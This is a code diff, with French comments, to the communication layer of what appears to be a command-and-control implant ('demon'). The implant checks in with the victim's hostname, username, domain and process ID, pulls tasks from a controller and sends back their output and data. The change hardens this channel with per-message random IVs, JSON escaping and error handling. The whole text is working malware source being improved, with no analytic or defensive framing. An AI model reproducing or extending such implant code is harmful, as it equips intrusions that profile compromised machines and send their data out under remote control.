@@ -13,6 +13,7 @@
 #include "../network/transport.h"
 #include "../tasks/dispatcher.h"
 #include "../utils/memory.h"
+#include "../utils/strings.h"
 #include "config.h"
 
 #include <time.h>
@@ -252,6 +253,20 @@ int demon_checkin(void) {
     strncpy(domain, env_domain, MAX_DOMAIN_LEN - 1);
   }
 
+  /* Échappe les strings pour éviter l'injection JSON */
+  char *esc_hostname = json_escape(hostname);
+  char *esc_username = json_escape(username);
+  char *esc_domain = json_escape(domain);
+  char *esc_agent_id = json_escape(g_demon.config.agent_id);
+
+  if (!esc_hostname || !esc_username || !esc_domain || !esc_agent_id) {
+    free(esc_hostname);
+    free(esc_username);
+    free(esc_domain);
+    free(esc_agent_id);
+    return STATUS_NO_MEMORY;
+  }
+
   /* Construit le JSON manuellement (pas de lib externe) */
   char json[2048];
   snprintf(json, sizeof(json),
@@ -268,24 +283,44 @@ int demon_checkin(void) {
            "\"elevated\":false"
            "}"
            "}",
-           g_demon.config.agent_id, hostname, username, domain,
+           esc_agent_id, esc_hostname, esc_username, esc_domain,
            GetCurrentProcessId());
 
-  /* Chiffre et envoie */
+  free(esc_hostname);
+  free(esc_username);
+  free(esc_domain);
+  free(esc_agent_id);
+
+  /* Génère un IV aléatoire pour ce message */
+  uint8_t random_iv[AES_BLOCK_SIZE];
+  aes_generate_iv(random_iv);
+
+  /* Chiffre avec l'IV aléatoire */
   uint8_t *encrypted = NULL;
   size_t encrypted_len = 0;
 
   int status =
       aes_encrypt((uint8_t *)json, strlen(json), g_demon.config.aes_key,
-                  g_demon.config.aes_iv, &encrypted, &encrypted_len);
+                  random_iv, &encrypted, &encrypted_len);
 
   if (status != STATUS_SUCCESS) {
     return STATUS_CRYPTO_ERROR;
   }
 
-  /* Encode en base64 */
-  char *b64_data = base64_encode(encrypted, encrypted_len);
+  /* Préfixe l'IV au ciphertext pour que le serveur puisse déchiffrer */
+  size_t total_len = AES_BLOCK_SIZE + encrypted_len;
+  uint8_t *iv_plus_cipher = (uint8_t *)malloc(total_len);
+  if (!iv_plus_cipher) {
+    secure_free(encrypted, encrypted_len);
+    return STATUS_NO_MEMORY;
+  }
+  memcpy(iv_plus_cipher, random_iv, AES_BLOCK_SIZE);
+  memcpy(iv_plus_cipher + AES_BLOCK_SIZE, encrypted, encrypted_len);
   secure_free(encrypted, encrypted_len);
+
+  /* Encode en base64 */
+  char *b64_data = base64_encode(iv_plus_cipher, total_len);
+  free(iv_plus_cipher);
 
   if (!b64_data) {
     return STATUS_NO_MEMORY;
@@ -318,10 +353,21 @@ int demon_get_tasks(task_t **tasks, int *task_count) {
   *tasks = NULL;
   *task_count = 0;
 
+  /* Échappe l'agent_id */
+  char *esc_agent_id = json_escape(g_demon.config.agent_id);
+  if (!esc_agent_id) {
+    return STATUS_NO_MEMORY;
+  }
+
   /* Prépare la requête */
   char json[512];
   snprintf(json, sizeof(json), "{\"action\":\"get_tasks\",\"id\":\"%s\"}",
-           g_demon.config.agent_id);
+           esc_agent_id);
+  free(esc_agent_id);
+
+  /* Génère un IV aléatoire */
+  uint8_t random_iv[AES_BLOCK_SIZE];
+  aes_generate_iv(random_iv);
 
   /* Chiffre */
   uint8_t *encrypted = NULL;
@@ -329,15 +375,26 @@ int demon_get_tasks(task_t **tasks, int *task_count) {
 
   int status =
       aes_encrypt((uint8_t *)json, strlen(json), g_demon.config.aes_key,
-                  g_demon.config.aes_iv, &encrypted, &encrypted_len);
+                  random_iv, &encrypted, &encrypted_len);
 
   if (status != STATUS_SUCCESS) {
     return STATUS_CRYPTO_ERROR;
   }
 
-  /* Base64 */
-  char *b64_data = base64_encode(encrypted, encrypted_len);
+  /* Préfixe l'IV */
+  size_t total_len = AES_BLOCK_SIZE + encrypted_len;
+  uint8_t *iv_plus_cipher = (uint8_t *)malloc(total_len);
+  if (!iv_plus_cipher) {
+    secure_free(encrypted, encrypted_len);
+    return STATUS_NO_MEMORY;
+  }
+  memcpy(iv_plus_cipher, random_iv, AES_BLOCK_SIZE);
+  memcpy(iv_plus_cipher + AES_BLOCK_SIZE, encrypted, encrypted_len);
   secure_free(encrypted, encrypted_len);
+
+  /* Base64 */
+  char *b64_data = base64_encode(iv_plus_cipher, total_len);
+  free(iv_plus_cipher);
 
   if (!b64_data) {
     return STATUS_NO_MEMORY;
@@ -360,16 +417,22 @@ int demon_get_tasks(task_t **tasks, int *task_count) {
   uint8_t *decoded = base64_decode(response, response_len, &decoded_len);
   free(response);
 
-  if (!decoded) {
+  if (!decoded || decoded_len < AES_BLOCK_SIZE) {
+    free(decoded);
     return STATUS_CRYPTO_ERROR;
   }
 
-  /* Déchiffre */
+  /* Extrait l'IV du début du message */
+  uint8_t recv_iv[AES_BLOCK_SIZE];
+  memcpy(recv_iv, decoded, AES_BLOCK_SIZE);
+
+  /* Déchiffre avec l'IV extrait */
   uint8_t *decrypted = NULL;
   size_t decrypted_len = 0;
 
-  status = aes_decrypt(decoded, decoded_len, g_demon.config.aes_key,
-                       g_demon.config.aes_iv, &decrypted, &decrypted_len);
+  status =
+      aes_decrypt(decoded + AES_BLOCK_SIZE, decoded_len - AES_BLOCK_SIZE,
+                  g_demon.config.aes_key, recv_iv, &decrypted, &decrypted_len);
 
   secure_free(decoded, decoded_len);
 
@@ -377,10 +440,7 @@ int demon_get_tasks(task_t **tasks, int *task_count) {
     return STATUS_CRYPTO_ERROR;
   }
 
-  /* Parse le JSON des tâches - parsing minimal */
-  /* TODO: Implémenter un vrai parser JSON */
-  /* Pour l'instant on parse manuellement */
-
+  /* Parse le JSON des tâches */
   status = dispatcher_parse_tasks((char *)decrypted, decrypted_len, tasks,
                                   task_count);
   secure_free(decrypted, decrypted_len);
@@ -393,8 +453,19 @@ int demon_send_result(task_result_t *result) {
     return STATUS_FAILURE;
   }
 
-  /* Construit le JSON du résultat */
-  /* Pour les données binaires, on les encode en base64 séparément */
+  /* Échappe les strings */
+  char *esc_agent_id = json_escape(g_demon.config.agent_id);
+  char *esc_task_id = json_escape(result->task_id);
+  char *esc_output = json_escape(result->output ? result->output : "");
+
+  if (!esc_agent_id || !esc_task_id || !esc_output) {
+    free(esc_agent_id);
+    free(esc_task_id);
+    free(esc_output);
+    return STATUS_NO_MEMORY;
+  }
+
+  /* Encode données binaires en base64 */
   char *data_b64 = NULL;
   if (result->data && result->data_len > 0) {
     data_b64 = base64_encode(result->data, result->data_len);
@@ -402,9 +473,12 @@ int demon_send_result(task_result_t *result) {
 
   /* Alloue un buffer assez grand */
   size_t json_size =
-      1024 + result->output_len + (data_b64 ? strlen(data_b64) : 0);
+      1024 + strlen(esc_output) + (data_b64 ? strlen(data_b64) : 0);
   char *json = (char *)malloc(json_size);
   if (!json) {
+    free(esc_agent_id);
+    free(esc_task_id);
+    free(esc_output);
     if (data_b64)
       free(data_b64);
     return STATUS_NO_MEMORY;
@@ -419,12 +493,19 @@ int demon_send_result(task_result_t *result) {
            "\"output\":\"%s\""
            "%s%s%s"
            "}",
-           g_demon.config.agent_id, result->task_id, result->status,
-           result->output ? result->output : "", data_b64 ? ",\"data\":\"" : "",
-           data_b64 ? data_b64 : "", data_b64 ? "\"" : "");
+           esc_agent_id, esc_task_id, result->status, esc_output,
+           data_b64 ? ",\"data\":\"" : "", data_b64 ? data_b64 : "",
+           data_b64 ? "\"" : "");
 
+  free(esc_agent_id);
+  free(esc_task_id);
+  free(esc_output);
   if (data_b64)
     free(data_b64);
+
+  /* Génère un IV aléatoire */
+  uint8_t random_iv[AES_BLOCK_SIZE];
+  aes_generate_iv(random_iv);
 
   /* Chiffre */
   uint8_t *encrypted = NULL;
@@ -432,7 +513,7 @@ int demon_send_result(task_result_t *result) {
 
   int status =
       aes_encrypt((uint8_t *)json, strlen(json), g_demon.config.aes_key,
-                  g_demon.config.aes_iv, &encrypted, &encrypted_len);
+                  random_iv, &encrypted, &encrypted_len);
 
   free(json);
 
@@ -440,9 +521,20 @@ int demon_send_result(task_result_t *result) {
     return STATUS_CRYPTO_ERROR;
   }
 
-  /* Base64 et envoie */
-  char *b64_data = base64_encode(encrypted, encrypted_len);
+  /* Préfixe l'IV */
+  size_t total_len = AES_BLOCK_SIZE + encrypted_len;
+  uint8_t *iv_plus_cipher = (uint8_t *)malloc(total_len);
+  if (!iv_plus_cipher) {
+    secure_free(encrypted, encrypted_len);
+    return STATUS_NO_MEMORY;
+  }
+  memcpy(iv_plus_cipher, random_iv, AES_BLOCK_SIZE);
+  memcpy(iv_plus_cipher + AES_BLOCK_SIZE, encrypted, encrypted_len);
   secure_free(encrypted, encrypted_len);
+
+  /* Base64 et envoie */
+  char *b64_data = base64_encode(iv_plus_cipher, total_len);
+  free(iv_plus_cipher);
 
   if (!b64_data) {
     return STATUS_NO_MEMORY;
